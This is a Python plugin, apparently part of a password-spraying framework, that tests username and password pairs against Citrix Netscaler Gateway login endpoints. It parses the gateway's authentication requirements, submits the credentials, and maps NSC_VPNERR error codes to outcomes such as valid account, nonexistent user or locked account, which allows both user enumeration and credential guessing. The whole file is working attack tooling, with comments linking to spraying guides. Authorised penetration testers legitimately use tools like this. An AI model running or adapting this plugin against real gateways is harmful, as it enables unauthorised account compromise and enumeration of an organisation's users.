import xml.etree.ElementTree as ET

class Plugin:
    def __init__(self, requester, pluginargs):
        self.requester = requester
        self.pluginargs = pluginargs

    def validate(self):
        """
        This functions verifies if the plugin args are correctly defined
        """

        if not "url" in self.pluginargs.keys():
            return False, "You must provide a valid Citrix Netscaler Gateway URL (Ex: https://target.com/p/u or https://target.com/nf/auth)"
        else:
            return True, None

    def testconnect(self, useragent):
        """
        This functions verifies if everything is good network-wise
        """

        r = self.requester.post(self.pluginargs["url"]+"/getAuthenticationRequirements.do", headers = {"User-Agent": useragent})
        if r.status_code == 200:
            root = ET.fromstring(r.text)
            stateContext = root.find(".//{*}StateContext")
            if stateContext != None:
                self.pluginargs["authRequirements"] = r # Save authentication requirements
                return True
            else:
                return False
        else:
            return False

    def test_authenticate(self, username, password, useragent):
        """
        This functions authenticates
        """

        # TODO: Validate each response with returned values to a dedicated local environment (if possible)

        data_response = {
            "result": None, # either "success", "inexistant", "potential" or "failure"
            "error": False, # if there's an error (to indicate that a retry is needed)
            "output": None, # return message
            "request": None, # represents the request, useful for example to print the cookies obtained
        }

        # User enum and verbose error message
        #   https://pwn.no0.be/recon/citrix/enum_users/
        #   https://jamesonhacking.blogspot.com/2018/11/password-spraying-citrix-netscalers-by.html
        #   https://www.citrix.com/blogs/2014/06/11/enhanced-authentication-feedback/
        # Format = data_response['result'], data_response['output']
        NSC_VPNERR = {
            "4001": ["failure", "Incorrect user name or password"],
            "4002": ["potential", "You do not have permission to log on"],
            "4003": ["failure", "Cannot connect to server. Try connecting again in a few minutes"],
            "4004": ["failure", "Cannot connect. Try connecting again"],
            "4005": ["failure", "Cannot connect. Try connecting again"],
            "4006": ["inexistant", "Incorrect user name"],
            "4007": ["failure", "Incorrect password"],
            "4008": ["failure", "Passwords do not match"],
            "4009": ["inexistant", "User not found"],
            "4010": ["potential", "You do not have permission to log on at this time"],
            "4011": ["potential", "Your account is disabled"],
            "4012": ["potential", "Your password has expired"],
            "4013": ["potential", "You do not have permission to log on"],
            "4014": ["potential", "Could not change your password"],
            "4015": ["potential", "Your account is temporarily locked"],
            "4016": ["potential", "Could not update your password. The password must meet the length, complexity, and history requirements of the domain"],
            "4017": ["failure", "Unable to process your request"],
            "4018": ["potential", "Your device failed to meet compliance requirements. Please check with your administrator"],
            "4019": ["potential", "Your device is not managed. Please check with your administrator"]
        }

        def getDisplayValues(requirement):
            res = []
            for displayValue in requirement.findall('.//{*}DisplayValue'):
                value = displayValue.find('./{*}Value')
                if value != None and value.text != None and value.text != '':
                    res += [value.text]

            return res

        try:

            r = self.pluginargs["authRequirements"]
            data_response['request'] = r

            # Parse required login parameters

            validParams = True
            data = {}
            root = ET.fromstring(r.text)
            stateContext = root.find(".//{*}StateContext").text
            data["StateContext"] = stateContext
            for requirement in root.findall('.//{*}Requirement'):
                param = requirement.find('./{*}Credential/{*}ID')
                label = requirement.find('./{*}Label/{*}Text')
                button = requirement.find('./{*}Input/{*}Button')
                
                if param is not None and param.text != None and param.text != '':
                    param = param.text
                    if param.lower() == "login":
                        data[param] = username
                    elif param.lower() == "passwd":
                        data[param] = password
                    elif param.lower() == "savecredentials":
                        data[param] = "false"
                    elif param.lower() == "FIXME":
                        # FIXME: Here you can handle additional parameters if required, otherwise validParams will be set to False and no authentication requests will be send
                        # Common additional parameters are: domain, passwd1 (2FA for example), etc.
                        pass
                    else:
                        if button is None:
                            validParams = False
                            displayValues = getDisplayValues(requirement)
                            break
                        else:
                            if button.text != None and button.text != '':
                                data[param] = button.text
                            else:
                                data[param] = "Log on"

            if not validParams: # An additional parameter is required to login but not handled

                data_response['result'] = 'failure'
                if label != None:
                    if label.text != None and label.text != '':
                        label = label.text
                    else:
                        label = 'None'
                if displayValues == []:
                    data_response['output'] = f"Parameter '{param}' (Label = '{label}') required by the server and not handled. No possible values found. Edit 'FIXME' into the plugin to handle It"
                else:
                    data_response['output'] = f"Parameter '{param}' (Label = '{label}') required by the server and not handled. Possible values = {displayValues}. Edit 'FIXME' into the plugin to handle It"

            else:

                # Send the login request

                headers = {
                    "User-Agent": useragent,
                    "X-Citrix-Am-Credentialtypes": "none, username, domain, password, newpassword, passcode, savecredentials, textcredential, webview, negotiate, nsg_push, nsg_push_otp, nf_sspr_rem, nsg-epa, nsg-epa-v2, nsg-x1, nsg-setclient, nsg-eula, nsg-tlogin, nsg-fullvpn, nsg-hidden, nsg-auth-failure, nsg-auth-success, nsg-epa-success, nsg-l20n, GoBack, nf-recaptcha, ns-dialogue, nf-gw-test, nf-poll, nsg_qrcode, nsg_manageotp"
                }
            
                r = self.requester.post(self.pluginargs["url"]+"/doAuthentication.do", headers = headers, data = data)
                data_response['request'] = r
                errorCodeCookie = r.cookies.get("NSC_VPNERR")

                if errorCodeCookie == None: # No NSC_VPNERR cookie returned => Parse the <Result> XML node

                    # https://developer-docs.citrix.com/en-us/storefront/citrix-storefront-authentication-sdk/common-authentication-forms-language.html
                    root = ET.fromstring(r.text)
                    result = root.find(".//{*}Result").text
                    
                    if result in ["success", "update-credentials"]: # Authentication succeeded

                        data_response['result'] = "success"
                        data_response['output'] = f"Valid account found"
                    
                    else: # Authentication failed

                        if result == "more-info": # Try to extract error message

                            data_response['result'] = "failure"
                            data_response['output'] = f"Authentication failed. Return status: {result}"

                            for requirement in root.findall('.//{*}Requirement'):
                                label = requirement.find('./{*}Label')
                                if label != None:
                                    text = label.find('./{*}Text')
                                    type = label.find('./{*}Type')
                                    if type != None and type.text != None and type.text != '' and 'error' in type.text.lower(): # Known error types: 'nsg-l20n-error', 'l20n-error', 'error'
                                        if text != None and text.text != None and text.text != '':
                                            text = text.text
                                            if text.startswith('errorMessageLabel'): # We can use the NSC_VPNERR table

                                                errorCodeText = text.split('errorMessageLabel')[1].split('</Text>')[0]
                                                errorInfo = NSC_VPNERR.get(errorCodeText)

                                                if errorInfo == None: # NSC_VPNERR error code unknown
                    
                                                    data_response['error'] = True
                                                    data_response['output'] = f"Unknown NSC_VPNERR error code: {errorCodeText}. Check target's error codes at /logon/themes/Default/resources/en.xml"
                                                
                                                else: # NSC_VPNERR error code known => Return response
                                                
                                                    data_response['result'] = errorInfo[0]
                                                    data_response['output'] = errorInfo[1]

                                            else: # It may contains the error message directly

                                                data_response['output'] = text
                        
                        else: # No additional information provided

                            data_response['result'] = "failure"
                            data_response['output'] = f"Authentication failed. Return status: {result}"
                
                else: # NSC_VPNERR cookie returned => Authentication failed. Parse the cookie 
                
                    errorInfo = NSC_VPNERR.get(errorCodeCookie)

                    if errorInfo == None: # NSC_VPNERR error code unknown
                    
                        data_response['error'] = True
                        data_response['output'] = f"Unknown NSC_VPNERR error code: {errorCodeCookie}. Check target's error codes at /logon/themes/Default/resources/en.xml"
                    
                    else: # NSC_VPNERR error code known => Return response
                    
                        data_response['result'] = errorInfo[0]
                        data_response['output'] = errorInfo[1]

        except Exception as ex:

            data_response['error'] = True
            data_response['output'] = str(ex.__repr__())

        return data_response